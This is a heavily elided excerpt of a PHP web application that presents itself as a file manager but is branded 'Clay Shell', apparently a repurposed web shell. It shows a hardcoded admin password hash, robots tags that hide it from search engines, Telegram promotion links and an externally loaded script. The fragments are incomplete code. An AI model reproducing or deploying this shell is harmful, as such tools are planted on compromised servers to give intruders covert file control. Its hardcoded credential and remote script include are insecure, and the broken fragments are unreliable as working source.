...
/**
/**
 * The Clay | Basic source code: The Clay V
 * @recode by The Clay | Project
 * @email vertonix11@gmail.com
 * @SMM Panel https://sanzpanel.my.id
 * @Telegram https://t.me/biskuat13
 */
...
//Application Title
define('APP_TITLE', 'The Clay Team');
...
// Generate secure password hash - https://t.me/szxpl7docs/pwd.html
$auth_users = array(
    'admin' => '$2y$10$TFSGJhGFEYsBz8vAqgtGYeNHVajJLGvWTZc6LBTbJtxaUSSl9mAUO', //password
...
// sample config - https://t.me/szxpl7config-sample.txt
                ...
                <div class="row justify-content-md-center h-100">
                    <div class="card-wrapper">
                        ...
                        <div class="footer text-center">
                            &mdash;&mdash; &copy;
                            <a href="https://t.me/biskuat13" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">The Clay project</a> &mdash;&mdash;
                        </div>
                    </div>
                </div>
            </div>
            ...
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p><h3><a href="https://t.me/biskuat13" target="_blank" class="app-v-title"> Clay <?php echo VERSION; ?></a></h3></p>
                        <p>Author: sandi</p>
                        <p>Mail Us: <a href="mailto:mccabe8@proton.me">mccabe8[at]proton.me</a> </p>
                    </div>
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item"><a href="https://t.me/biskuat13" target="_blank"><i class="fa fa-question-circle"></i> <?php echo lng('Help Documents') ?> </a> </li>
                                <li class="list-group-item"><a href="https://t.me/biskuat13" target="_blank"><i class="fa fa-bug"></i> <?php echo lng('Report Issue') ?></a></li>
                                <?php if(!FM_READONLY) { ?>
...
<form action="" method="post" class="pt-3">
    ...
    <div class="row">
        ...
        <div class="col-3 d-none d-sm-block"><a href="https://t.me/biskuat13" target="_blank" class="float-right text-muted">The Clay <?php echo VERSION; ?></a></div>
        <?php else: ?>
            <div class="col-12"><a href="https://t.me/biskuat13" target="_blank" class="float-right text-muted">The Clay <?php echo VERSION; ?></a></div>
        <?php endif; ?>
    </div>
</form>
 ...
 class FM_Config
{
    ...
    function __construct()
    {
        ...
        if (strlen($CONFIG)) {
            ...
            $msg = 'The Clay<br>Error: Cannot load configuration';
            if (substr($fm_url, -1) == '/') {
                $fm_url = rtrim($fm_url, '/');
                $msg .= '<br>';
...
<html lang="en">
<head>
<center><div style="width:590px;max-width:100%;"><img src="https://i.ibb.co/kgYWLJF/clay.png">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with Clay">
    <meta name="author" content="The Clay project">
...
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with The Clay">
    <meta name="author" content="The Clay project">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <?php if($favicon_path) { echo '<link rel="icon" href="'.fm_enc($favicon_path).'" type="image/png">'; } ?>
...
<script src="https://cdn.prinsh.com/NathanPrinsley-effect/salju-terbang.js" type="text/javascript"></script>
</body>
</html>
...
function lng($txt) {
    ...
    // English Language
    $tr['en']['AppName']        = 'The Clay Team';      $tr['en']['AppTitle']           = 'Clay Shell';
